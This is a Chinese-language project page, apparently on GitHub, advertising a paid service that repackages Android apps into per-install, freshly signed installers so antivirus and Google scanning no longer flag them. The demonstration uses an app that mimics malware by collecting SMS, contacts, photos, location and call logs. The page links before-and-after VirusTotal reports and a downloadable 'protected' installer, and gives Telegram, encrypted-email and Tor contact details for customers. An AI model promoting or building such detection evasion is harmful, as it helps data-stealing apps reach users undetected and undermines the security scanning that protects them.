# 安卓报毒解决

## 介绍

不同于传统服务器代码加密 + 重复签名方案，该方案在只服务器端处理一次代码和资源，然后生成安装器下发用户，实现每次落地包都是全新签名且无特征。本方案极少使用反射，而使用android官方提供的稳定api实现代码、资源融合。因此在较新android版本（8.0+, 市场占有率95%+）上都可稳定运行，且与各品牌改动后的rom保持高兼容。本方案理论上长期有效。

## 示例

1. [此应用](https://github.com/android-virus-scan-bypass/android-virus-scan-bypass-pub/releases/download/v1.0.0/original.apk)是模仿恶意应用行为（手机sms，通讯录，照片，地理位置，通话记录等）开发的测试应用，virustotal多引擎多引擎[查出病毒](https://www.virustotal.com/gui/file/9b3c0e7b7bb015aaa8635c2e37208d6c406e5b5d631b994f5811932374da9cb5). Google 检测见图。重新打包进安装器（[点此下载测试安装器](https://github.com/android-security-scan-bypass/android-security-scan-bypass-pub/releases/download/v1.0.0/protected-installer.apk)）再安装后则正常（[处理后 virustotal 报告](https://www.virustotal.com/gui/file/58ba4b98bb43ee953ef9fdb02bcc9594b368fe83963b1975130ba58a5112317e)）（国外设备，基于 android 13）。完整视频[在此](https://github.com/android-security-scan-bypass/android-security-scan-bypass-pub/releases/download/v1.0.0/recording.mp4)。

> ![](assets/detected.png)

2. [此视频](https://github.com/android-virus-scan-bypass/android-virus-scan-bypass-pub/releases/download/v1.0.0/recording_cn.mp4)录制了另外一个真实案例（基于vivo，android 14），可下载查看。（为保护客户隐私，此apk不提供下载）

## 合作

- [TG客服](https://t.me/lry256)

- 邮箱：[lry255@proton.me](mailto:lry255@proton.me)
  
  - GPG 公钥
  
  - > ```
    > -----BEGIN PGP PUBLIC KEY BLOCK-----
    > 
    > mDMEZvflCBYJKwYBBAHaRw8BAQdAFmdJ7iDpmiVIu3Sa4PKzx5YxQTEjlXVOR6Uj
    > dPdK1Ty0GWxyeTI1NSA8bHJ5MjU1QHByb3Rvbi5tZT6ImQQTFgoAQRYhBGuCoCga
    > 5Qo9oV0f5sVlSZWEYfNaBQJm9+UIAhsDBQku/geABQsJCAcCAiICBhUKCQgLAgQW
    > AgMBAh4HAheAAAoJEMVlSZWEYfNaHtQBAIxwJue/8z0YUMyEvlKY7hf3ypPS1PNj
    > yICW3/EtMJ7BAQDjqD0t6pXNSwjFbVJR6bq8Xr+OxMUxAPLu4BhtFoktAbg4BGb3
    > 5QgSCisGAQQBl1UBBQEBB0AI0f95t93rZl+nGxb8y7kVmAik8LG2dabAWBFQ+zRE
    > MQMBCAeIfgQYFgoAJhYhBGuCoCga5Qo9oV0f5sVlSZWEYfNaBQJm9+UIAhsMBQku
    > /geAAAoJEMVlSZWEYfNaOFEA/3TaWmOhz3SM8mNAH4ErnskUNR6PIWWZWFz9h4Qq
    > 32e8AQC33LEh2ZA4cm+I+DsstI0t31pe0+ZkvY74c2hkyrAIBQ==
    > =Usbx
    > -----END PGP PUBLIC KEY BLOCK-----
    > ```

- tor网络地址防止失联：
  
  - ```
    http://bypass7vckrcx6e3655el3a74236ixvxwtivhqirdh6rmrtaqvwzjqyd.onion/
    ```
